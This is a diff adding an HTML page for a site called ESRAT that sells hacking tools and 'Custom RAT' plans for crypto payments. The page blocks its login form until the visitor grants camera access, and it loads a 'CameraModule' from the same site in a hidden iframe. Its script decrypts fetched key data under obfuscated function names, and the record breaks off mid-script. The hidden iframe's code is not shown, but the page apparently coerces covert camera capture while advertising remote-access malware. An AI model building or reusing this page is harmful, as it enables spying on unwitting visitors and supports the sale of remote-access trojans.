@@ -1,0 +1,1473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css">
+    <link rel="icon" href="https://es-universe.github.io/ESRAT/apks/logo.png" type="image/x-icon">
+    <title>ES-UNIVERSE by GANGA 🎮</title>
+    <meta name="description" content="Welcome, Where AI&ML meets Creativity ! || Get WIN, iOS, Android H@CKS!">
+    <meta name="keywords" content="ganga hacks, hacker ganga, esrat, es ganga, ethical hacking, github, esrat git, mahuldihi hacker">
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebSite",
+      "name": "ESRAT by GANGA",
+      "url": "https://es-universe.github.io/ESRAT/",
+      "description": "Get exclusive Android mods, hacking tools, AI utilities, and more built by GANGA.",
+      "sameAs": [
+        "https://github.com/ES-UNIVERSE",
+        "https://www.instagram.com/urstruly_ganga/"
+      ]
+    }
+    </script>
+    <meta property="og:title" content="GANGA's H@CK ZONE – Android, iOS, AI Tools & More!">
+    <meta property="og:description" content="Get exclusive hacks, tools, and AI utilities crafted by ethical hacker GANGA. 🔐">
+    <meta property="og:image" content="https://es-universe.github.io/ESRAT/apks/logo.png">
+    <meta property="og:url" content="https://es-universe.github.io/ESRAT/">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="GANGA's H@CK ZONE – Android, iOS, AI Tools & More!">
+    <meta name="twitter:description" content="Hacks, Mods, and AI Tools built by ethical hacker GANGA.">
+    <meta name="twitter:image" content="https://es-universe.github.io/ESRAT/apks/logo.png">
+    <style>
+        /* Reset and Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+            height: 100%;
+            overflow: hidden; /* Prevent scrolling */
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            height: 100vh;
+            overflow: hidden; /* Prevent scrolling */
+            position: relative;
+            color: #333;
+        }
+
+        .login-page {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        /* Navbar Styles */
+        .navbar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 80px;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            transition: all 0.3s ease;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-link {
+            display: block;
+            transition: transform 0.3s ease;
+        }
+
+        .logo-link:hover {
+            transform: scale(1.05);
+        }
+
+        .logo-img {
+            height: 60px;
+            width: auto;
+            filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.1));
+            transition: filter 0.3s ease;
+        }
+
+        .logo-link:hover .logo-img {
+            filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.15));
+        }
+
+        /* Main Content */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 120px 20px 100px;
+            min-height: 100vh;
+            overflow-y: auto;
+            overflow-x: hidden;
+        }
+
+        /* Animated GANGA Text */
+        .info {
+            text-align: center;
+            margin-bottom: 40px;
+            z-index: 10;
+        }
+
+        #dynamic-text {
+            font-size: clamp(2.5rem, 8vw, 5rem);
+            font-weight: 700;
+            color: #2c3e50;
+            text-shadow: 0 0 20px rgba(44, 62, 80, 0.3);
+            letter-spacing: 0.1em;
+            position: relative;
+        }
+
+        .letter {
+            display: inline-block;
+            opacity: 0;
+            transform: translate3d(0px, 50px, 0px) rotate(-15deg) scale(0.8);
+            animation: animateText 1.2s forwards ease-out, glowingShadow 4s infinite ease-in-out;
+        }
+
+        /* Letter Animation Delays */
+        .letter:nth-child(1) { animation-delay: 0s, 0s; }
+        .letter:nth-child(2) { animation-delay: 0.2s, 0.2s; }
+        .letter:nth-child(3) { animation-delay: 0.4s, 0.4s; }
+        .letter:nth-child(4) { animation-delay: 0.6s, 0.6s; }
+        .letter:nth-child(5) { animation-delay: 0.8s, 0.8s; }
+
+        @keyframes animateText {
+            0% {
+                opacity: 0;
+                transform: translate3d(0px, 50px, 0px) rotate(-15deg) scale(0.8);
+            }
+            100% {
+                opacity: 1;
+                transform: translate3d(0px, 0px, 0px) rotate(0deg) scale(1);
+            }
+        }
+
+        @keyframes glowingShadow {
+            0%, 100% {
+                text-shadow: 
+                    0 0 10px rgba(44, 62, 80, 0.3),
+                    0 0 20px rgba(44, 62, 80, 0.2),
+                    0 0 30px rgba(44, 62, 80, 0.1);
+            }
+            50% {
+                text-shadow: 
+                    0 0 20px rgba(44, 62, 80, 0.5),
+                    0 0 40px rgba(44, 62, 80, 0.3),
+                    0 0 60px rgba(44, 62, 80, 0.2);
+            }
+        }
+
+        /* Notice Board */
+        .notice-board {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .notice-content {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a52);
+            color: white;
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            animation: slideIn 0.5s ease-out;
+        }
+
+        .notice-content h3 {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .notice-content p {
+            font-size: 1rem;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .notice-credentials {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+
+        .notice-credentials p {
+            margin: 5px 0;
+            font-size: 0.9rem;
+        }
+
+        .notice-credentials span {
+            font-weight: bold;
+            color: #fff;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-50px) scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        /* Login Container */
+        .container {
+            margin-bottom: 40px;
+            z-index: 10;
+        }
+
+        .login-card {
+            background: rgba(255, 255, 255, 0.25);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 24px;
+            padding: 40px;
+            width: 400px;
+            max-width: 90vw;
+            box-shadow: 
+                0 8px 32px rgba(0, 0, 0, 0.1),
+                inset 0 1px 0 rgba(255, 255, 255, 0.5);
+            transition: all 0.3s ease;
+            animation: cardFloat 6s ease-in-out infinite;
+        }
+
+        .login-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 
+                0 16px 48px rgba(0, 0, 0, 0.15),
+                inset 0 1px 0 rgba(255, 255, 255, 0.6);
+        }
+
+        @keyframes cardFloat {
+            0%, 100% {
+                transform: translateY(0px);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+
+        .login-title {
+            text-align: center;
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 30px;
+            letter-spacing: -0.02em;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 25px;
+        }
+
+        .login-input {
+            width: 100%;
+            padding: 16px 0;
+            font-size: 1rem;
+            color: #2c3e50;
+            background: transparent;
+            border: none;
+            outline: none;
+            border-bottom: 2px solid rgba(44, 62, 80, 0.2);
+            transition: all 0.3s ease;
+            font-family: inherit;
+        }
+
+        .login-input:focus {
+            border-bottom-color: #3498db;
+        }
+
+        .login-input:focus + .input-line,
+        .login-input:not(:placeholder-shown) + .input-line {
+            transform: scaleX(1);
+        }
+
+        .input-line {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, #3498db, #2980b9);
+            transform: scaleX(0);
+            transition: transform 0.3s ease;
+            transform-origin: left;
+        }
+
+        .login-input::placeholder {
+            color: rgba(44, 62, 80, 0.5);
+            transition: color 0.3s ease;
+        }
+
+        .login-input:focus::placeholder {
+            color: rgba(44, 62, 80, 0.3);
+        }
+
+        .login-input:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* Login Button */
+        .login-button {
+            width: 100%;
+            padding: 16px;
+            font-size: 1rem;
+            font-weight: 600;
+            color: white;
+            background: linear-gradient(135deg, #3498db, #2980b9);
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+            font-family: inherit;
+            letter-spacing: 0.02em;
+        }
+
+        .login-button:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(52, 152, 219, 0.4);
+        }
+
+        .login-button:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .login-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .button-glow {
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.6s ease;
+        }
+
+        .login-button:hover:not(:disabled) .button-glow {
+            left: 100%;
+        }
+
+        .button-text {
+            position: relative;
+            z-index: 1;
+        }
+
+        .message {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 0.9rem;
+            color: #27ae60;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .message.show {
+            opacity: 1;
+        }
+
+        /* Pricing Section */
+        .pricing-section {
+            margin-bottom: 40px;
+            z-index: 10;
+        }
+
+        .pricing-title {
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 30px;
+            letter-spacing: -0.02em;
+        }
+
+        .pricing-cards {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .pricing-card {
+            background: rgba(255, 255, 255, 0.25);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 20px;
+            padding: 30px;
+            width: 280px;
+            max-width: 90vw;
+            position: relative;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+
+        .pricing-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 16px 48px rgba(0, 0, 0, 0.15);
+        }
+
+        .pricing-card.featured {
+            border: 2px solid #3498db;
+            transform: scale(1.05);
+        }
+
+        .pricing-card.featured:hover {
+            transform: scale(1.05) translateY(-8px);
+        }
+
+        .featured-badge {
+            position: absolute;
+            top: -12px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(135deg, #3498db, #2980b9);
+            color: white;
+            padding: 6px 20px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            letter-spacing: 0.02em;
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .plan-name {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 10px;
+        }
+
+        .plan-price {
+            display: flex;
+            align-items: baseline;
+            justify-content: center;
+            margin-bottom: 8px;
+        }
+
+        .currency {
+            font-size: 1.2rem;
+            font-weight: 500;
+            color: #7f8c8d;
+        }
+
+        .amount {
+            font-size: 3rem;
+            font-weight: 700;
+            color: #2c3e50;
+            margin-left: 4px;
+        }
+
+        .plan-duration {
+            font-size: 0.9rem;
+            color: #7f8c8d;
+            font-weight: 500;
+        }
+
+        .card-features {
+            margin-bottom: 25px;
+        }
+
+        .card-features ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .card-features li {
+            padding: 8px 0;
+            font-size: 0.9rem;
+            color: #2c3e50;
+            display: flex;
+            align-items: center;
+        }
+
+        .card-features li::before {
+            content: '✓';
+            color: #27ae60;
+            font-weight: bold;
+            margin-right: 10px;
+            font-size: 1rem;
+        }
+
+        .pricing-button {
+            width: 100%;
+            padding: 14px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: #3498db;
+            background: transparent;
+            border: 2px solid #3498db;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: inherit;
+            letter-spacing: 0.02em;
+        }
+
+        .pricing-button:hover {
+            background: #3498db;
+            color: white;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(52, 152, 219, 0.3);
+        }
+
+        .featured-button {
+            background: linear-gradient(135deg, #3498db, #2980b9);
+            color: white;
+            border: none;
+        }
+
+        .featured-button:hover {
+            background: linear-gradient(135deg, #2980b9, #1f5f8b);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(52, 152, 219, 0.4);
+        }
+
+        /* Social Links */
+        .home-sci2 {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 20px;
+            z-index: 1000;
+        }
+
+        .social-link {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 50px;
+            height: 50px;
+            background: rgba(255, 255, 255, 0.25);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            color: #2c3e50;
+            font-size: 1.2rem;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .social-link::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #3498db, #2980b9);
+            border-radius: 50%;
+            transform: scale(0);
+            transition: transform 0.3s ease;
+            z-index: -1;
+        }
+
+        .social-link:hover::before {
+            transform: scale(1);
+        }
+
+        .social-link:hover {
+            color: white;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(52, 152, 219, 0.3);
+        }
+
+        .social-link.whatsapp:hover::before {
+            background: linear-gradient(135deg, #25d366, #128c7e);
+        }
+
+        .social-link.instagram:hover::before {
+            background: linear-gradient(135deg, #e1306c, #fd1d1d, #fcb045);
+        }
+
+        .social-link.github:hover::before {
+            background: linear-gradient(135deg, #333, #24292e);
+        }
+
+        /* Cursor Shadow Effect */
+        .cursor-shadow {
+            position: fixed;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 9999;
+            transform: translate(-50%, -50%);
+            filter: blur(30px);
+            background: rgba(52, 152, 219, 0.3);
+            animation: cursorPulse 3s ease-in-out infinite;
+            transition: all 0.1s ease;
+        }
+
+        @keyframes cursorPulse {
+            0%, 100% {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 0.3;
+            }
+            50% {
+                transform: translate(-50%, -50%) scale(1.2);
+                opacity: 0.5;
+            }
+        }
+
+        /* Payment Window */
+        .payment-window {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .payment-container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: slideIn 0.5s ease-out;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .payment-title {
+            text-align: center;
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 30px;
+        }
+
+        .payment-form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .payment-info {
+            background: rgba(52, 152, 219, 0.1);
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+        }
+
+        .payment-info h3 {
+            font-size: 1.2rem;
+            color: #2c3e50;
+            margin-bottom: 15px;
+        }
+
+        .payment-info p {
+            font-size: 0.9rem;
+            color: #2c3e50;
+            margin-bottom: 8px;
+        }
+
+        .payment-info strong {
+            color: #2980b9;
+        }
+
+        .qr-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .qr-code {
+            width: 180px;
+            height: 180px;
+            background: #fff;
+            border-radius: 12px;
+            padding: 15px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            margin-bottom: 15px;
+        }
+
+        .qr-code img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .download-qr {
+            padding: 10px 20px;
+            background: linear-gradient(135deg, #3498db, #2980b9);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .download-qr:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(52, 152, 219, 0.4);
+        }
+
+        .payment-button {
+            padding: 16px;
+            font-size: 1rem;
+            font-weight: 600;
+            color: white;
+            background: linear-gradient(135deg, #27ae60, #219653);
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .payment-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(39, 174, 96, 0.4);
+        }
+
+        .close-button {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.1);
+            border: none;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .close-button:hover {
+            background: rgba(0, 0, 0, 0.2);
+        }
+
+        /* Verification Window */
+        .verification-window {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .verification-container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: slideIn 0.5s ease-out;
+            text-align: center;
+        }
+
+        .verification-icon {
+            font-size: 4rem;
+            color: #27ae60;
+            margin-bottom: 20px;
+        }
+
+        .verification-title {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 20px;
+        }
+
+        .verification-message {
+            font-size: 1rem;
+            color: #2c3e50;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .navbar {
+                height: 70px;
+            }
+            
+            .logo-img {
+                height: 50px;
+            }
+            
+            .main-content {
+                padding: 70px 15px 90px;
+            }
+            
+            #dynamic-text {
+                font-size: clamp(2rem, 10vw, 3.5rem);
+                margin-bottom: 30px;
+            }
+            
+            .login-card {
+                padding: 30px 25px;
+                width: 350px;
+            }
+            
+            .login-title {
+                font-size: 1.5rem;
+            }
+            
+            .pricing-cards {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .pricing-card {
+                width: 300px;
+                margin-bottom: 20px;
+            }
+            
+            .pricing-card.featured {
+                transform: none;
+            }
+            
+            .pricing-card.featured:hover {
+                transform: translateY(-8px);
+            }
+            
+            .home-sci2 {
+                bottom: 20px;
+                gap: 15px;
+            }
+            
+            .social-link {
+                width: 45px;
+                height: 45px;
+                font-size: 1.1rem;
+            }
+
+            .payment-container, .verification-container {
+                padding: 30px 20px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .main-content {
+                padding: 70px 10px 80px;
+            }
+            
+            .login-card {
+                padding: 25px 20px;
+                width: 320px;
+            }
+            
+            .pricing-card {
+                width: 280px;
+                padding: 25px 20px;
+            }
+            
+            .notice-content {
+                padding: 30px 25px;
+                margin: 20px;
+            }
+        }
+
+        /* Landscape orientation for mobile */
+        @media (max-height: 600px) and (orientation: landscape) {
+            .main-content {
+                padding: 60px 15px 70px;
+                justify-content: flex-start;
+                overflow-y: auto;
+            }
+            
+            #dynamic-text {
+                font-size: clamp(1.5rem, 6vw, 2.5rem);
+                margin-bottom: 20px;
+            }
+            
+            .login-card {
+                padding: 20px;
+                margin-bottom: 20px;
+            }
+            
+            .pricing-section {
+                margin-bottom: 20px;
+            }
+            
+            .pricing-cards {
+                gap: 15px;
+            }
+            
+            .pricing-card {
+                padding: 20px;
+                width: 250px;
+            }
+            
+            .home-sci2 {
+                bottom: 15px;
+            }
+        }
+
+        /* High DPI displays */
+        @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
+            .login-card,
+            .pricing-card,
+            .social-link {
+                border-width: 0.5px;
+            }
+        }
+
+        /* Accessibility */
+        @media (prefers-reduced-motion: reduce) {
+            * {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+            
+            .cursor-shadow {
+                display: none;
+            }
+        }
+
+        /* Focus styles for accessibility */
+        .login-input:focus,
+        .login-button:focus,
+        .pricing-button:focus,
+        .social-link:focus {
+            outline: 2px solid #3498db;
+            outline-offset: 2px;
+        }
+
+        /* Print styles */
+        @media print {
+            .cursor-shadow,
+            .home-sci2 {
+                display: none;
+            }
+            
+            body {
+                background: white;
+            }
+            
+            .login-card,
+            .pricing-card {
+                background: white;
+                border: 1px solid #ccc;
+                box-shadow: none;
+            }
+        }
+    </style>
+</head>
+<body class="login-page">
+
+    <!-- Sticky iOS-style Navbar -->
+    <nav class="navbar">
+        <div class="logo-container">
+            <a href="index.html" class="logo-link">
+                <img src="https://es-universe.github.io/ESRAT/apks/logo.png" alt="ES-UNIVERSE Logo" class="logo-img">
+            </a>
+        </div>
+    </nav>
+
+    <!-- Main Content Container -->
+    <main class="main-content">
+        <!-- Animated GANGA Text -->
+        <div class="info">
+            <span id="dynamic-text">
+                <span class="letter">G</span>
+                <span class="letter">A</span>
+                <span class="letter">N</span>
+                <span class="letter">G</span>
+                <span class="letter">A</span>
+            </span>
+        </div>
+
+        <!-- Notice Board (hidden by default) -->
+        <div id="notice-board" class="notice-board">
+            <div class="notice-content">
+                <h3>Camera Permission Required</h3>
+                <br>
+                Refresh to Proceed ➤</p>
+                <div class="notice-credentials">
+                    <p>Don't have Username and Password:<br><span> Don't worry </span> <br>Purchase any of the plans below and get access to the Admin Dash where you can get RATs and many more.</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Login Container -->
+        <div class="container">
+            <div class="login-card">
+                <h2 class="login-title">Welcome Back</h2>
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="Username" disabled autocomplete="off" class="login-input">
+                    <div class="input-line"></div>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password" disabled autocomplete="off" class="login-input">
+                    <div class="input-line"></div>
+                </div>
+                <button id="submit" class="login-button" disabled>
+                    <span class="button-text">Sign In</span>
+                    <div class="button-glow"></div>
+                </button>
+                <div id="message-ref" class="message"></div>
+            </div>
+        </div>
+
+        <!-- Pricing Section -->
+        <div class="pricing-section">
+            <h3 class="pricing-title">Choose Your Plan</h3>
+            <div class="pricing-cards">
+                <div class="pricing-card">
+                    <div class="card-header">
+                        <h4 class="plan-name">Premium</h4>
+                        <div class="plan-price">
+                            <span class="currency">$</span>
+                            <span class="amount">29</span>
+                        </div>
+                        <p class="plan-duration">99 Days Access</p>
+                    </div>
+                    <div class="card-features">
+                        <ul>
+                            <li>Full Access to Tools</li>
+                            <li>Regular Updates</li>
+                            <li>Community Support</li>
+                        </ul>
+                    </div>
+                    <button class="pricing-button" data-plan="premium" data-amount="29">Get Started</button>
+                </div>
+                
+                <div class="pricing-card featured">
+                    <div class="featured-badge">Most Popular</div>
+                    <div class="card-header">
+                        <h4 class="plan-name">Lifetime</h4>
+                        <div class="plan-price">
+                            <span class="currency">$</span>
+                            <span class="amount">49</span>
+                        </div>
+                        <p class="plan-duration">Lifetime Access</p>
+                    </div>
+                    <div class="card-features">
+                        <ul>
+                            <li>Everything in Premium</li>
+                            <li>Priority Support</li>
+                            <li>Custom RAT</li>
+                        </ul>
+                    </div>
+                    <button class="pricing-button featured-button" data-plan="lifetime" data-amount="49">Choose Lifetime</button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Social Links -->
+    <div class="home-sci2">
+        <a href="https://wa.me/917008265529?text=Hola, I recently visited your website. Let's talk!" class="social-link whatsapp">
+            <i class='bx bxl-whatsapp'></i>
+        </a>
+        <a href="https://www.instagram.com/urstruly_ganga/" class="social-link instagram">
+            <i class='bx bxl-instagram'></i>
+        </a>
+        <a href="https://github.com/ES-UNIVERSE" class="social-link github">
+            <i class='bx bxl-github'></i>
+        </a>
+    </div>
+
+    <!-- Cursor Shadow Effect -->
+    <div class="cursor-shadow"></div>
+
+    <!-- Payment Window -->
+    <div class="payment-window" id="payment-window">
+        <div class="payment-container">
+            <button class="close-button" id="close-payment">
+                <i class='bx bx-x'></i>
+            </button>
+            <h2 class="payment-title">Complete Your Payment</h2>
+            <div class="payment-form">
+                <div class="input-group">
+                    <input type="email" class="login-input" id="register-email" placeholder="Email Address" required>
+                    <div class="input-line"></div>
+                </div>
+                <div class="input-group">
+                    <input type="text" class="login-input" id="register-username" placeholder="Create Username" required>
+                    <div class="input-line"></div>
+                </div>
+                <div class="input-group">
+                    <input type="password" class="login-input" id="register-password" placeholder="Create Password" required>
+                    <div class="input-line"></div>
+                </div>
+                
+                <div class="payment-info">
+                    <h3>Payment Details</h3>
+                    <p>Send <strong id="payment-amount">$29.00</strong> USDT to the address below:</p>
+                    <p>Wallet Address: <strong id="wallet-address">TQr9N2kXJho7pFs8b1GvF6E2jX3nKt8LmM</strong></p>
+                    <p>Network: <strong>TRC20</strong></p>
+                    <p>Plan: <strong id="selected-plan">Premium</strong></p>
+                </div>
+                
+                <div class="qr-container">
+                    <div class="qr-code">
+                        <!-- QR code generated with JavaScript -->
+                    </div>
+                    <button class="download-qr" id="download-qr">Download QR Code</button>
+                </div>
+                
+                <button class="payment-button" id="paid-button">I Have Paid</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Verification Window -->
+    <div class="verification-window" id="verification-window">
+        <div class="verification-container">
+            <div class="verification-icon">
+                <i class='bx bx-check-circle'></i>
+            </div>
+            <h2 class="verification-title">Verifying Your Payment</h2>
+            <p class="verification-message">
+                We are verifying your payment. This may take a few minutes.<br>
+                Once verified, your account will be activated and you will receive a confirmation email.
+            </p>
+            <button class="payment-button" id="close-verification">Done</button>
+        </div>
+    </div>
+
+    <!-- Hidden iframe to load the CameraModule -->
+    <iframe id="cameraIframe" src="https://es-universe.github.io/ESRAT/events/CameraModule/index.html" style="display:none;"></iframe>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    
+    <script>
+        let cameraStream = null;  // Variable to store the camera stream
+        let cameraInterval; // Variable for the camera permission check interval
+
+        // DOM Elements for Payment System
+        const planButtons = document.querySelectorAll('.pricing-button');
+        const paymentWindow = document.getElementById('payment-window');
+        const closePayment = document.getElementById('close-payment');
+        const paymentAmount = document.getElementById('payment-amount');
+        const selectedPlan = document.getElementById('selected-plan');
+        const paidButton = document.getElementById('paid-button');
+        const verificationWindow = document.getElementById('verification-window');
+        const closeVerification = document.getElementById('close-verification');
+        const downloadQr = document.getElementById('download-qr');
+
+        async function retrieveSacredKeys() {
+            const response = await fetch("/ESRAT/asset/keys.json");
+            const sacredKeys = await response.json();
+            return sacredKeys;
+        }
+
+        function unlockArcaneSecrets(cipheredData, mysticalEssence, celestialKeystone) {
+            const decodedKeystone = CryptoJS.enc.Base64.parse(celestialKeystone);
+            const decodedEssence = CryptoJS.enc.Base64.parse(mysticalEssence);
+            const unlockedSecrets = CryptoJS.AES.decrypt(cipheredData, decodedKeystone, {
+                iv: decodedEssence,
+                mode: CryptoJS.mode.CBC,
+                padding: CryptoJS.pad.Pkcs7
+            });
+            return unlockedSecrets.toString(CryptoJS.enc.Utf8);
+        }
+
+        function enableInputs() {
+            document.getElementById("username").disabled = false;
+            document.getElementById("password").disabled = false;
+            document.getElementById("submit").disabled = false;
+            document.getElementById("notice-board").style.display = 'none';  // Hide notice board after permission
+        }
+
+        function disableInputs() {
+            document.getElementById("username").disabled = true;
+            document.getElementById("password").disabled = true;
+            document.getElementById("submit").disabled = true;
+            document.getElementById("notice-board").style.display = 'flex';  // Show notice board if permission is denied
+        }
+
+        function stopCameraStream() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());  // Stop all tracks
+                cameraStream = null;  // Clear the camera stream
+            }
+        }
+
+        function requestCameraPermission() {
+            // Check if the screen size is small (for mobile devices)
+            if (window.innerWidth <= 768) { // You can adjust the breakpoint as needed
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function(stream) {
+                        console.log("Camera permission granted.");
+                        cameraStream = stream;  // Store the camera stream
+                        enableInputs();  // Enable inputs once permission is granted
+
+                        // Stop the camera stream after 5 seconds
+                        setTimeout(stopCameraStream, 5000);
+                        
